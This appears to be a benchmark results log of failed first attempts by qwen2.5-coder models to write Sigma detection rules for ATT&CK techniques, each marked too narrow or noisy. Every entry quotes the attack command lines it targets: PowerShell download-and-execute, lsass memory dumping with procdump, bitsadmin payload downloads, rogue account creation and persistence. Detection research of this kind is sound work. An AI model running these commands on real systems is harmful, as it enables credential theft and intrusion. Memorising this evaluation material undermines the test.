# Non-PASS first-try rules

qwen2.5-coder:7b T1059.001 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')
Variant: powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"
Detection:
selection:
  Image|endswith: \powershell.exe
  CommandLine|contains|windash|all:
  - -nop
  - -w hidden
  - -c
  - IEX
  - DownloadString
condition: selection

qwen2.5-coder:7b T1059.001 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')
Variant: powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"
Detection:
selection:
  Image|endswith: \powershell.exe
  CommandLine|contains|windash|all:
  - -nop
  - -w hidden
  - -c
  - IEX
  - DownloadString
condition: selection

qwen2.5-coder:7b T1059.001 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')
Variant: powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"
Detection:
selection:
  Image|endswith: \powershell.exe
  CommandLine|contains|windash|all:
  - -nop
  - -w hidden
  - -c
  - IEX
  - DownloadString
condition: selection

qwen2.5-coder:7b T1218.011 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: rundll32.exe C:\Windows\Temp\driver.sys,Run
Variant: rundll32.exe D:\drivers\helper.sys,Start
Detection:
selection:
  Image|endswith: \rundll32.exe
  CommandLine|contains|all:
  - C:\\Windows\\Temp\\driver.sys
  - Run
condition: selection

qwen2.5-coder:7b T1218.011 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: rundll32.exe C:\Windows\Temp\driver.sys,Run
Variant: rundll32.exe D:\drivers\helper.sys,Start
Detection:
selection:
  Image|endswith: \rundll32.exe
  CommandLine|contains|all:
  - C:\Windows\Temp\driver.sys
  - Run
condition: selection

qwen2.5-coder:7b T1218.011 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: rundll32.exe C:\Windows\Temp\driver.sys,Run
Variant: rundll32.exe D:\drivers\helper.sys,Start
Detection:
selection:
  Image|endswith: \rundll32.exe
  CommandLine|contains|all:
  - C:\\Windows\\Temp\\driver.sys
  - Run
condition: selection

qwen2.5-coder:7b T1053.005 repeat 1: NOISY
Error: fired on harmless benign line
Shown line: schtasks.exe /create /tn Updater /tr C:\Users\student\AppData\Local\Temp\x.exe /sc once /st 12:00
Variant: schtasks.exe /create /sc once /tn Cleanup /tr C:\Windows\Temp\run.bat /st 09:30
Detection:
selection:
  Image|endswith: \schtasks.exe
  CommandLine|contains|all:
  - /create
  - /tr
  - /sc
  - /st
condition: selection

qwen2.5-coder:7b T1053.005 repeat 3: NOISY
Error: fired on harmless benign line
Shown line: schtasks.exe /create /tn Updater /tr C:\Users\student\AppData\Local\Temp\x.exe /sc once /st 12:00
Variant: schtasks.exe /create /sc once /tn Cleanup /tr C:\Windows\Temp\run.bat /st 09:30
Detection:
selection:
  Image|endswith: \schtasks.exe
  CommandLine|contains|all:
  - /create
  - /tr
  - /sc
  - /st
condition: selection

qwen2.5-coder:7b T1547.001 repeat 1: NOISY
Error: fired on harmless benign line
Shown line: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\student\x.exe
Variant: reg.exe add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Task /t REG_SZ /d C:\Users\Public\m.exe /f
Detection:
selection:
  Image|endswith: \reg.exe
  CommandLine|contains|all:
  - /v
  - /d
condition: selection

qwen2.5-coder:7b T1547.001 repeat 2: NOISY
Error: fired on harmless benign line
Shown line: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\student\x.exe
Variant: reg.exe add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Task /t REG_SZ /d C:\Users\Public\m.exe /f
Detection:
selection:
  Image|endswith: \reg.exe
  CommandLine|contains|all:
  - /v
  - /d
condition: selection

qwen2.5-coder:7b T1547.001 repeat 3: NOISY
Error: fired on harmless benign line
Shown line: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\student\x.exe
Variant: reg.exe add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Task /t REG_SZ /d C:\Users\Public\m.exe /f
Detection:
selection:
  Image|endswith: \reg.exe
  CommandLine|contains|all:
  - /v
  - /d
condition: selection

qwen2.5-coder:7b T1136.001 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: net.exe user hacker P@ssw0rd123 /add
Variant: net1.exe user svc_backup Winter2026! /add /domain
Detection:
selection:
  Image|endswith: \net.exe
  CommandLine|contains|windash: /add
condition: selection

qwen2.5-coder:7b T1136.001 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: net.exe user hacker P@ssw0rd123 /add
Variant: net1.exe user svc_backup Winter2026! /add /domain
Detection:
selection:
  Image|endswith: \net.exe
  CommandLine|contains|windash: /add
condition: selection

qwen2.5-coder:7b T1136.001 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: net.exe user hacker P@ssw0rd123 /add
Variant: net1.exe user svc_backup Winter2026! /add /domain
Detection:
selection:
  Image|endswith: \net.exe
  CommandLine|contains|windash: /add
condition: selection

qwen2.5-coder:7b T1003.001 repeat 1: NOISY
Error: fired on harmless benign line
Shown line: procdump.exe -ma lsass.exe lsass.dmp
Variant: procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp
Detection:
selection:
  Image|endswith: \procdump.exe
  CommandLine|contains|windash: -ma
condition: selection

qwen2.5-coder:7b T1003.001 repeat 2: NOISY
Error: fired on harmless benign line
Shown line: procdump.exe -ma lsass.exe lsass.dmp
Variant: procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp
Detection:
selection:
  Image|endswith: \procdump.exe
  CommandLine|contains|windash: -ma
condition: selection

qwen2.5-coder:7b T1003.001 repeat 3: NOISY
Error: fired on harmless benign line
Shown line: procdump.exe -ma lsass.exe lsass.dmp
Variant: procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp
Detection:
selection:
  Image|endswith: \procdump.exe
  CommandLine|contains|windash: -ma
condition: selection

qwen2.5-coder:7b T1197 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: bitsadmin.exe /transfer job1 /download /priority high http://10.0.0.5/evil.dll C:\Users\student\evil.dll
Variant: bitsadmin.exe /transfer j2 /download /priority normal https://files.example.net/p.ps1 C:\Users\Public\p.ps1
Detection:
selection:
  Image|endswith: \bitsadmin.exe
  CommandLine|contains|all:
  - /download
  - /priority
  - http://10.0.0.5/
condition: selection

qwen2.5-coder:7b T1197 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: bitsadmin.exe /transfer job1 /download /priority high http://10.0.0.5/evil.dll C:\Users\student\evil.dll
Variant: bitsadmin.exe /transfer j2 /download /priority normal https://files.example.net/p.ps1 C:\Users\Public\p.ps1
Detection:
selection:
  Image|endswith: \bitsadmin.exe
  CommandLine|contains|all:
  - /download
  - /priority
  - http://
condition: selection

qwen2.5-coder:7b T1197 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: bitsadmin.exe /transfer job1 /download /priority high http://10.0.0.5/evil.dll C:\Users\student\evil.dll
Variant: bitsadmin.exe /transfer j2 /download /priority normal https://files.example.net/p.ps1 C:\Users\Public\p.ps1
Detection:
selection:
  Image|endswith: \bitsadmin.exe
  CommandLine|contains|all:
  - /download
  - /priority
  - http://10.0.0.5/
condition: selection

qwen2.5-coder:7b T1047 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: wmic.exe process call create "cmd.exe /c calc.exe"
Variant: wmic.exe /node:10.0.0.8 process call create "powershell.exe -enc AAAA"
Detection:
selection:
  Image|endswith: \wmic.exe
  CommandLine|contains|windash: /c
condition: selection

qwen2.5-coder:14b T1059.001 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')
Variant: powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"
Detection:
selection:
  Image|endswith: \powershell.exe
  CommandLine|contains|windash|all:
  - -nop
  - -w hidden
  - -c IEX
condition: selection

qwen2.5-coder:14b T1059.001 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')
Variant: powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"
Detection:
selection:
  Image|endswith: \powershell.exe
  CommandLine|contains|windash|all:
  - -nop
  - -w hidden
  - -c IEX
condition: selection

qwen2.5-coder:14b T1059.001 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')
Variant: powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"
Detection:
selection:
  Image|endswith: \powershell.exe
  CommandLine|contains|windash|all:
  - -nop
  - -w hidden
  - -c IEX
condition: selection

qwen2.5-coder:14b T1053.005 repeat 1: NOISY
Error: fired on harmless benign line
Shown line: schtasks.exe /create /tn Updater /tr C:\Users\student\AppData\Local\Temp\x.exe /sc once /st 12:00
Variant: schtasks.exe /create /sc once /tn Cleanup /tr C:\Windows\Temp\run.bat /st 09:30
Detection:
selection:
  Image|endswith: \schtasks.exe
  CommandLine|contains|windash|all:
  - /create
  - /tr
condition: selection

qwen2.5-coder:14b T1053.005 repeat 2: NOISY
Error: fired on harmless benign line
Shown line: schtasks.exe /create /tn Updater /tr C:\Users\student\AppData\Local\Temp\x.exe /sc once /st 12:00
Variant: schtasks.exe /create /sc once /tn Cleanup /tr C:\Windows\Temp\run.bat /st 09:30
Detection:
selection:
  Image|endswith: \schtasks.exe
  CommandLine|contains|windash|all:
  - /create
  - /tr
condition: selection

qwen2.5-coder:14b T1053.005 repeat 3: NOISY
Error: fired on harmless benign line
Shown line: schtasks.exe /create /tn Updater /tr C:\Users\student\AppData\Local\Temp\x.exe /sc once /st 12:00
Variant: schtasks.exe /create /sc once /tn Cleanup /tr C:\Windows\Temp\run.bat /st 09:30
Detection:
selection:
  Image|endswith: \schtasks.exe
  CommandLine|contains|windash|all:
  - /create
  - /tr
condition: selection

qwen2.5-coder:14b T1547.001 repeat 1: NOISY
Error: fired on harmless benign line
Shown line: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\student\x.exe
Variant: reg.exe add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Task /t REG_SZ /d C:\Users\Public\m.exe /f
Detection:
selection:
  Image|endswith: \reg.exe
  CommandLine|contains|windash|all:
  - add
  - /v
  - /d
condition: selection

qwen2.5-coder:14b T1547.001 repeat 2: NOISY
Error: fired on harmless benign line
Shown line: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\student\x.exe
Variant: reg.exe add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Task /t REG_SZ /d C:\Users\Public\m.exe /f
Detection:
selection:
  Image|endswith: \reg.exe
  CommandLine|contains|windash|all:
  - add
  - /v
  - /d
condition: selection

qwen2.5-coder:14b T1547.001 repeat 3: NOISY
Error: fired on harmless benign line
Shown line: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\student\x.exe
Variant: reg.exe add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Task /t REG_SZ /d C:\Users\Public\m.exe /f
Detection:
selection:
  Image|endswith: \reg.exe
  CommandLine|contains|windash|all:
  - add
  - /v
  - /d
condition: selection

qwen2.5-coder:14b T1136.001 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: net.exe user hacker P@ssw0rd123 /add
Variant: net1.exe user svc_backup Winter2026! /add /domain
Detection:
selection:
  Image|endswith: \net.exe
  CommandLine|contains|windash: /add
condition: selection

qwen2.5-coder:14b T1136.001 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: net.exe user hacker P@ssw0rd123 /add
Variant: net1.exe user svc_backup Winter2026! /add /domain
Detection:
selection:
  Image|endswith: \net.exe
  CommandLine|contains|windash: /add
condition: selection

qwen2.5-coder:14b T1136.001 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: net.exe user hacker P@ssw0rd123 /add
Variant: net1.exe user svc_backup Winter2026! /add /domain
Detection:
selection:
  Image|endswith: \net.exe
  CommandLine|contains|windash: /add
condition: selection

qwen2.5-coder:14b T1003.001 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: procdump.exe -ma lsass.exe lsass.dmp
Variant: procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp
Detection:
selection:
  Image|endswith: \procdump.exe
  CommandLine|contains|windash|all:
  - -ma
  - lsass.exe
condition: selection

qwen2.5-coder:14b T1003.001 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: procdump.exe -ma lsass.exe lsass.dmp
Variant: procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp
Detection:
selection:
  Image|endswith: \procdump.exe
  CommandLine|contains|windash|all:
  - -ma
  - lsass.exe
condition: selection

qwen2.5-coder:14b T1003.001 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: procdump.exe -ma lsass.exe lsass.dmp
Variant: procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp
Detection:
selection:
  Image|endswith: \procdump.exe
  CommandLine|contains|windash|all:
  - -ma
  - lsass.exe
condition: selection

